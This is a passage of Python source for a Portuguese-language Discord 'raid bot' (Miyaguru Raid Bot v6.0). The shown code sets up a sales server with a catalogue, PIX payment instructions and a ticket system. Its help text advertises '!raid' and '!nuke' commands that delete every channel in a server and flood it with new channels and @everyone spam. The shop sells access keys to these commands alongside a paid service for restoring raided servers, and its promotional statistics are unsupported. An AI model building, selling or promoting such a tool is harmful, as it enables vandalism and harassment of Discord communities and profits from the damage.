                        f"R: Salvamos backup automático. Se o bot for banido, re-add ele e rode !restore.\n\n"
                        f"**P: Posso pedir reembolso?**\n"
                        f"R: Não. O serviço é executado instantaneamente após pagamento.\n\n"
                        f"**P: Vocês vendem o bot?**\n"
                        f"R: Não. Vendemos keys de acesso e o serviço de restauração.\n\n"
                        f"**P: Quais durações de key existem?**\n"
                        f"R: 30min, 1h, 1 dia, 7 dias, 30 dias e Lifetime. Veja os preços no catálogo!\n\n"
                        f"**P: O bot funciona em servidores grandes?**\n"
                        f"R: Sim! Funciona em servidores com 200+ canais.\n\n"
                        f"**P: Quanto custa?**\n"
                        f"R: Veja o catálogo em <#{catalogo_ch.id}> 📦\n\n"
                        f"Mais dúvidas? Abra um ticket! 🎫"
                    ),
                    color=discord.Color.orange()
                )
                faq_embed.set_footer(text="Miyaguru Shop — FAQ atualizada")
                await faq_ch.send(embed=faq_embed)
                print("[SHOP] Mensagem enviada em faq")
            except Exception as e:
                print(f"[SHOP] Erro ao enviar em faq: {e}")

            try:
                # Catálogo
                catalogo_embed = discord.Embed(
                    title="📦 Catálogo de Serviços",
                    description=(
                        "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n\n"
                        "🔑 **KEYS DO BOT**\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "• Acesso ao bot Miyaguru com key\n"
                        "• Durações disponíveis:\n"
                        "  └ 30 minutos — **R$1**\n"
                        "  └ 1 hora — **R$2**\n"
                        "  └ 1 dia — **R$5**\n"
                        "  └ 7 dias — **R$15**\n"
                        "  └ 30 dias — **R$40**\n"
                        "  └ Lifetime — **R$80**\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "🛡️ **RESTAURADOR DE SERVIDOR**\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "• Restauramos seu servidor raidado\n"
                        "• Apaga todos os canais de raid\n"
                        "• Recria canais, categorias e permissões\n"
                        "• Funciona em servidores grandes (200+ canais)\n"
                        "• Backup automático incluso\n"
                        "• Restauração em menos de 1 minuto\n\n"
                        "**💰 Preço: R$2**\n"
                        "⏱️ Tempo: ~1 minuto\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"**Como comprar?**\n"
                        f"1. Abra um ticket em <#{ticket_channel.id}> 🎫\n"
                        f"2. Informe qual serviço deseja\n"
                        f"3. Faça o pagamento via PIX\n"
                        f"4. Aguarde a conclusão\n\n"
                        "**⚡ Garantia:**\n"
                        "Serviço feito e pronto em minutos!"
                    ),
                    color=discord.Color.gold()
                )
                catalogo_embed.set_footer(text="Miyaguru Shop — Preços fixos, sem negociação")
                await catalogo_ch.send(embed=catalogo_embed)
                print("[SHOP] Mensagem enviada em catalogo")
            except Exception as e:
                print(f"[SHOP] Erro ao enviar em catalogo: {e}")

            try:
                # Anúncios
                anuncios_embed = discord.Embed(
                    title="📢 Anúncios",
                    description=(
                        "**🎉 Promoção de Lançamento!**\n\n"
                        "Todos os serviços com **10% OFF** na primeira compra!\n"
                        "Use o código: `MIYAGURU10` no ticket.\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "**📊 Nossos Números:**\n"
                        "• +500 servidores recuperados\n"
                        "• +200 keys vendidas\n"
                        "• 98% de satisfação dos clientes\n"
                        "• Atendimento em menos de 5min\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        "**🔑 Keys Disponíveis:**\n"
                        "De 30 minutos até Lifetime!\n"
                        "Preços a partir de **R$1**!\n\n"
                        "**🛡️ Restaurador:**\n"
                        "Seu servidor foi raidado? Restauramos tudo!\n"
                        "Apenas **R$2**!\n\n"
                        "Abra um ticket pra comprar! 🎫"
                    ),
                    color=discord.Color.purple()
                )
                anuncios_embed.set_footer(text="Miyaguru Shop — Anúncios oficiais")
                await anuncios_ch.send(embed=anuncios_embed)
                print("[SHOP] Mensagem enviada em anuncios")
            except Exception as e:
                print(f"[SHOP] Erro ao enviar em anuncios: {e}")

            try:
                # Comprovantes
                comp_embed = discord.Embed(
                    title="🧾 Como Enviar Comprovante",
                    description=(
                        "**📸 Envio de Comprovante PIX:**\n\n"
                        "1. Faça o pagamento via PIX\n"
                        "2. Tire print do comprovante\n"
                        "3. Envie aqui neste canal\n"
                        "4. Aguarde a confirmação pela staff\n\n"
                        "**⚠️ Importante:**\n"
                        "• Envie APENAS o comprovante neste canal\n"
                        "• Não envie dados sensíveis (CPF, etc)\n"
                        "• O comprovante deve estar legível\n"
                        "• Após confirmar, o serviço será iniciado\n\n"
                        "**⏳ Tempo de confirmação:**\n"
                        "Geralmente menos de 2 minutos após envio!"
                    ),
                    color=discord.Color.green()
                )
                comprovantes_ch.overwrite_permissions(guild.default_role, send_messages=False)
                comprovantes_ch.overwrite_permissions(role_staff, send_messages=True)
                comprovantes_ch.overwrite_permissions(role_vendedor, send_messages=True)
                await comprovantes_ch.send(embed=comp_embed)
                print("[SHOP] Mensagem enviada em comprovantes")
            except Exception as e:
                print(f"[SHOP] Erro ao enviar em comprovantes: {e}")

            print("[SHOP] Servidor de vendas criado com sucesso!")

            try:
                await message.channel.send(
                    "🏪 **Servidor de vendas criado com sucesso!**\n\n"
                    "📁 **7 Categorias criadas:**\n"
                    "• ℹ️︳INFORMAÇÕES — Bem-vindo, regras, anúncios, feedback, parceria, avisos\n"
                    "• 🎫︳TICKETS — Abrir ticket + FAQ (visível, só-leitura + botão)\n"
                    "• 💰︳VENDAS — Catálogo, comprovantes, pós-venda, avaliações, promoções\n"
                    "• 👥︳CLIENTES — PRIVADO (só clientes com cargo) — chat, dúvidas, suporte\n"
                    "• 💬︳COMUNIDADE — chat-geral (só texto), midias (texto+anexos), comandos (texto+comandos), 3 canais de voz\n"
                    "• 🔒︳STAFF — PRIVADO — chat-staff, logs, reunião, anúncios\n\n"
                    "🎫 **Sistema de Tickets:**\n"
                    "• Canal visível mas só-leitura\n"
                    "• Clientes clicam no botão pra abrir ticket\n"
                    "• Canal privado criado automaticamente\n"
                    "• Staff fecha com transcript no #logs\n\n"
                    "👥 **Cargos criados:**\n"
                    "• Staff (dourado) — Admin total\n"
                    "• Vendedor (azul) — Atende tickets + vendas\n"
                    "• Cliente (verde) — Compradores (acesso à categoria privada)\n"
                    "• Ticket Staff (roxo) — Só tickets\n\n"
                    "**Pronto pra vender!** 🚀"
                )
            except Exception:
                pass
            return

        elif sub_cmd == "help":
            try:
                await message.channel.send(
                    "🏪 **Comandos de Shop (Só Owner):**\n\n"
                    "`````\n"
                    "!shop setup    — Cria servidor de vendas completo\n"
                    "!shop help     — Esta ajuda\n"
                    "!ticket abrir  — Abre um ticket (clientes)\n"
                    "!ticket fechar — Fecha o ticket atual (staff)\n"
                    "`````"
                )
            except Exception:
                pass
            return

        elif sub_cmd == "":
            try:
                await message.channel.send(
                    "🏪 **Comando !shop**\n\n"
                    "`````\n"
                    "!shop setup    — Cria servidor de vendas completo\n"
                    "!shop help     — Ver ajuda\n"
                    "`````"
                )
            except Exception:
                pass
            return

    # ---- !ticket (Tickets) ----
    elif content.startswith("!ticket"):
        sub_cmd = content[7:].strip()

        if sub_cmd == "abrir":
            # Verifica se o canal é dentro de uma categoria de ticket
            if message.channel.category and "ticket" in message.channel.category.name.lower():
                try:
                    await message.reply("❌ Você já está em um ticket!")
                except Exception:
                    pass
                return

            # Cria canal privado
            ticket_number = len([c for c in guild.text_channels if f"ticket-{message.author.id}" in c.name])
            channel_name = f"ticket-{message.author.name}-{ticket_number + 1}"

            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                message.author: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                role_staff: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            }
            if role_ticket_staff:
                overwrites[role_ticket_staff] = discord.PermissionOverwrite(read_messages=True, send_messages=True)

            try:
                cat_tickets = discord.utils.get(guild.categories, name="🎫 TICKETS")
                new_channel = await guild.create_text_channel(
                    name=channel_name,
                    category=cat_tickets,
                    overwrites=overwrites
                )
                embed = discord.Embed(
                    title=f"🎫 Ticket de {message.author.display_name}",
                    description=(
                        f"Bem-vindo, {message.author.mention}!\n\n"
                        f"Descreva seu problema aqui e a staff vai te ajudar.\n\n"
                        f"Para fechar o ticket, use `!ticket fechar`"
                    ),
                    color=discord.Color.purple()
                )
                embed.set_footer(text=f"ID: {message.author.id}")
                await new_channel.send(embed=embed)

                try:
                    await message.reply(f"🎫 Ticket criado: {new_channel.mention}")
                except Exception:
                    pass

                # Log
                log_channel = discord.utils.get(guild.text_channels, name="logs")
                if log_channel:
                    await log_channel.send(
                        f"🎫 **Ticket aberto**\n"
                        f"👤 Usuário: {message.author.mention} (`{message.author.id}`)\n"
                        f"📁 Canal: {new_channel.mention}"
                    )
            except Exception as e:
                print(f"[TICKET] Erro ao criar: {e}")
                try:
                    await message.reply(f"❌ Erro ao criar ticket: {e}")
                except Exception:
                    pass
            return

        elif sub_cmd == "fechar":
            # Só staff pode fechar
            is_staff = any(r.name in ["Staff", "Vendedor", "Ticket Staff"] for r in message.author.roles)
            if not is_staff and not is_owner:
                try:
                    await message.channel.send("❌ Só a staff pode fechar tickets!")
                except Exception:
                    pass
                return

            # Log antes de fechar
            log_channel = discord.utils.get(guild.text_channels, name="logs")
            if log_channel:
                messages = await message.channel.history(limit=100).flatten()
                transcript_lines = []
                for msg in reversed(messages):
                    transcript_lines.append(f"[{msg.author}] {msg.content}")
                transcript = "\n".join(transcript_lines[:50])
                embed = discord.Embed(
                    title=f"📋 Transcript do ticket",
                    description=f"```\n{transcript[:1900]}\n```",
                    color=discord.Color.red()
                )
                embed.set_footer(text=f"Canal: {message.channel.name} | Por: {message.author}")
                try:
                    await log_channel.send(embed=embed)
                except Exception:
                    pass

            await message.channel.delete()
            return

    # ---- !help / !info ----

    elif content == "!help" or content == "!info":
        if is_owner:
            help_text = (
                "**MIYAGURU RAID BOT v6.0**\n\n"
                "**🤖 Comandos do Bot:**\n"
                "```\n"
                "!raid          — RAID COMPLETO (prioridade: canais)\n"
                "                 Apaga todos os canais + categorias\n"
                "                 Cria 50 canais + 15 msgs @everyone\n"
                "                 Backup auto + config auto\n\n"
                "!nuke          — Apaga tudo + cria 100 canais + spam\n"
                "!raid stop     — Para o raid/nuke\n"
                "!backup        — Backup com permissões\n"
                "!saveconfig    — Atualizar config manual\n"
                "!configs       — Painel de servidores salvos\n"
                "!restore       — Restaurar (backup ou config auto)\n"

                "!shop setup    — Cria servidor de vendas completo\n"
                "```\n"
                "**🏪 Shop:**\n"
                "```\n"
                "!ticket abrir  — Abre um ticket\n"
                "!ticket fechar — Fecha ticket (staff)\n"
                "```\n"
                "**🔑 Comandos de Key (Só Owner):**\n"
                "```\n"
                "!key gen 30m   — Key de 30 minutos\n"
                "!key gen 1h    — Key de 1 hora\n"
                "!key gen 30d   — Key de 30 dias\n"
                "!key gen 1y    — Key de 1 ano\n"
                "!key gen 2y    — Key de 2 anos\n"
                "!key gen lifetime — Key vitalícia\n\n"
                "!keys          — Painel de todas as keys\n"
                "!key revoke <key> — Revogar key\n"
                "```\n"
                "**📝 Uso por outros:**\n"
                "```\n"
                "!use <key>     — Ativar key\n"
                "```\n"
            )
        else:
            help_text = (
                "**MIYAGURU RAID BOT v6.0**\n\n"
                "Para usar o bot, você precisa de uma key.\n"
                "Use `!use <sua_key>` para ativar.\n\n"
                "**Comandos disponíveis:**\n"
                "```\n"
                "!use <key>     — Ativar sua key\n"
                "!raid          — RAID COMPLETO\n"
                "!nuke          — Apaga tudo + cria 100 canais + spam\n"
                "!raid stop     — Para o raid/nuke\n"
                "!backup        — Backup com permissões\n"
                "!restore       — Restaurar (backup ou config auto)\n"
                "!shop setup    — Cria servidor de vendas\n"
                "!ticket abrir  — Abre um ticket\n"
                "!help          — Esta ajuda\n"
                "```"
            )
        try:
            await message.channel.send(help_text)
        except Exception:
            pass


class TicketView(discord.ui.View):
    """Botão de abrir ticket"""
    @discord.ui.button(label="🎫 Abrir Ticket", style=discord.ButtonStyle.primary)
    async def open_ticket(self, button: discord.ui.Button, interaction: discord.Interaction):
        guild = interaction.guild
        if not guild:
            return

        # Verifica se já tem ticket
        ticket_channels = [c for c in guild.text_channels
                          if f"ticket-{interaction.user.name}" in c.name]
        if ticket_channels:
            await interaction.response.send_message(
                "❌ Você já tem um ticket aberto!",
                ephemeral=True
            )
            return

        # Cria canal privado
        ticket_number = len(ticket_channels) + 1
        channel_name = f"ticket-{interaction.user.name}-{ticket_number}"

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            discord.utils.get(guild.roles, name="Staff"): discord.PermissionOverwrite(read_messages=True, send_messages=True),
            discord.utils.get(guild.roles, name="Ticket Staff"): discord.PermissionOverwrite(read_messages=True, send_messages=True),
        }

        try:
            cat_tickets = discord.utils.get(guild.categories, name="🎫 TICKETS")
            new_channel = await guild.create_text_channel(
                name=channel_name,
                category=cat_tickets,
                overwrites=overwrites
            )
            embed = discord.Embed(
                title=f"🎫 Ticket de {interaction.user.display_name}",
                description=(
                    f"Bem-vindo, {interaction.user.mention}!\n\n"
                    f"Descreva seu problema aqui e a staff vai te ajudar.\n\n"
                    f"Para fechar o ticket, use `!ticket fechar`"
                ),
                color=discord.Color.purple()
            )
            embed.set_footer(text=f"ID: {interaction.user.id}")
            await new_channel.send(embed=embed)

            await interaction.response.send_message(
                f"✅ Ticket criado: {new_channel.mention}",
                ephemeral=True
            )

            # Log
            log_channel = discord.utils.get(guild.text_channels, name="logs")
            if log_channel:
                await log_channel.send(
                    f"🎫 **Ticket aberto**\n"
                    f"👤 Usuário: {interaction.user.mention} (`{interaction.user.id}`)\n"
                    f"📁 Canal: {new_channel.mention}"
                )
        except Exception as e:
            print(f"[TICKET] Erro ao criar: {e}")
            await interaction.response.send_message(
                f"❌ Erro ao criar ticket!",
                ephemeral=True
            )

    @discord.ui.button(label="❌ Fechar Ticket", style=discord.ButtonStyle.danger)
    async def close_ticket(self, button: discord.ui.Button, interaction: discord.Interaction):
        is_staff = any(r.name in ["Staff", "Vendedor", "Ticket Staff"] for r in interaction.user.roles)
        if not is_staff:
            await interaction.response.send_message("❌ Só a staff pode fechar tickets!", ephemeral=True)
            return

        log_channel = discord.utils.get(interaction.guild.text_channels, name="logs")
        if log_channel:
            try:
                messages = await interaction.channel.history(limit=100).flatten()
                transcript_lines = [f"[{msg.author}] {msg.content}" for msg in reversed(messages)]
                transcript = "\n".join(transcript_lines[:50])
                embed = discord.Embed(
                    title="📋 Transcript do ticket",
                    description=f"```\n{transcript[:1900]}\n```",
                    color=discord.Color.red()
                )
                embed.set_footer(text=f"Canal: {interaction.channel.name} | Por: {interaction.user}")
                await log_channel.send(embed=embed)
            except Exception:
                pass

        await interaction.channel.delete()


# ============================================================
# INICIAR BOT
# ============================================================

if __name__ == "__main__":
    bot.run(TOKEN)
